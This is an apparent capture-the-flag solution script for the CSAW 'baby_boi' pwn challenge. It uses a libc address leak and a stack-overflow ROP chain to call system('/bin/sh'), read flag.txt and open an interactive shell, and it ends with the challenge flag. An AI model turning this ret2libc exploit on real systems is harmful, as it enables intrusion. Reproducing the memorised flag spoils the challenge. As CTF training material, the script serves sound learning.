#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.chal.csaw.io --port 1005 baby_boi
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('baby_boi')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.chal.csaw.io'
port = int(args.PORT or 1005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x000000000040072E
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.recvuntil("Here I am: ")
leak = int(io.recvline()[:-1], 16)

log.info("leak: {:#x}".format(leak))

libc = ELF("./libc-2.27.so")
libc.address = leak - libc.symbols["printf"]
log.info("libc base: {:#x}".format(libc.address))

rop = p64(0x400587) # main

pop_rdi = libc.address + 0x2155f
pop_rdi = 0x0000000000400793

# align the stack
rop = p64(pop_rdi+1)
rop += p64(pop_rdi)
rop += p64(libc.search("/bin/sh").next())
rop += p64(libc.symbols["system"])

pad = "A"* (0x28)
time.sleep(0.5)
io.sendline(pad + rop)

io.sendline("cat flag.txt")

io.interactive()
# flag{baby_boi_dodooo_doo_doo_dooo}
